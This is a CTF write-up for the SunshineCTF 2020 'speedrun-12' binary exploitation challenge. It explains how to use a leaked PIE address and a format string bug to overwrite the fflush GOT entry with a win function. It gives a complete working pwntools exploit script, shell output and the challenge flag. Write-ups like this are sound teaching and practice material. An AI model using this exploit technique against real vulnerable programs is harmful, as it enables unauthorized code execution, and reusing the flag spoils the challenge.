# speedrun-12

## Task

nc chal.2020.sunshinectf.org 30012

File: chall_12

Tags: binary exploitation, format string vulnerability

## Solution

This task is basically the same as `speedrun-11`, except that we have PIE enabled and get an adress from the first memory region leaked.

We can use that to calculate the base address and the address of the second memory region, since their offsets are the same all the time.

In the second memory region is the `reloc.fflush` entry. We need to overwrite 8 bytes so we use an extended version of our previous payload.

We calculate:

 - `leak_addr - 0x0639` - memory region one
 - `mem_one   + 0x1000` - memory region two
 - `mem_two   + 0x09fc` - `reloc.fflush` entry, set a breakpoint at `fflush@plt` to find that out
 - `mem_one   + 0x05ad` - `sym.win` function

Now that we have all that we need to write 2 bytes at a time into the `reloc.fflush`.

If the second byte is less than the first one we write that first.

This is all we need:

```python
from pwn import *

e = ELF("./chall_12", checksec=False)

#p = e.process()
p = remote("chal.2020.sunshinectf.org", 30012)

info(p.recvuntil("Just a single second: "))
addr = p.recv()

addr_int = int(addr, 16)

mem_one = addr_int - 0x0639
mem_two = mem_one  + 0x1000

rel_fflush = mem_two + 0x09fc
sym_win    = mem_one + 0x05ad

part_one = sym_win >>  0 & 0xffff # low bytes
part_two = sym_win >> 16 & 0xffff # high bytes

payload  = p32(rel_fflush)
payload += p32(rel_fflush + 2) # addr of high bytes

if part_one > part_two:
        payload += "%{}x%7$hn".format(part_two - len(payload))
        payload += "%{}x%6$hn".format(part_one - part_two)
else:   
        payload += "%{}x%6$hn".format(part_one - len(payload))
        payload += "%{}x%7$hn".format(part_two - part_one)

p.sendline()
p.sendline(payload)
p.recvline()

p.interactive()
```

And we get our flag:

```bash
$ python2 pwny.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30012: Done
[*] Just a single second:
[*] Switching to interactive mode
$ ls
chall_12
flag.txt
$ cat flag.txt
sun{the-stage-351efbcaebfda0d5}
```
